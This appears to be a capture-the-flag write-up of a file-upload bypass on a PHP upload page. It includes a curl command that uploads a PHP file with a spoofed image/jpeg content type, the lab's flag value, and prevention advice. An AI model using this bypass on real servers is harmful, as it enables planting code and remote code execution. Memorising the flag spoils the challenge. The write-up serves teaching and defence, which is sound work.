# File Upload Bypass Vulnerability

## Overview
The upload feature at `/index.php?page=upload` allows attackers to upload PHP files by tricking the application to accept non-image files.

---

## Discovery

1. Upload form only allows `.jpg` and `.jpeg` files.
2. JavaScript blocks empty uploads, but not actual file content.
3. The app checks file extensions but not the real content.

---

## Exploitation

### **cURL Content-Type Spoofing**

```bash
echo '<?php echo "hello"; ?>' > test.php

curl http://<IP_ADDRESS>/index.php?page=upload \
  -F "Upload=Upload" \
  -F "uploaded=@test.php;type=image/jpeg" \
  -F "MAX_FILE_SIZE=100000" | grep "flag"
```
- The PHP file is uploaded as if it’s a JPEG by spoofing the content-type.

---

## Flag

`46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

---

## Security Impact

- **Remote Code Execution:** Upload and run PHP code on the server
- **Data Theft:** Access sensitive files and data
- **System Compromise:** Full server takeover possible

---

## Prevention

1. **Validate actual file content, not just extensions**
2. **Use libraries (like fileinfo) for file type checks**
3. **Re-encode images on the server**
4. **Store uploads in non-executable locations**
5. **Apply a strict Content Security Policy**

---
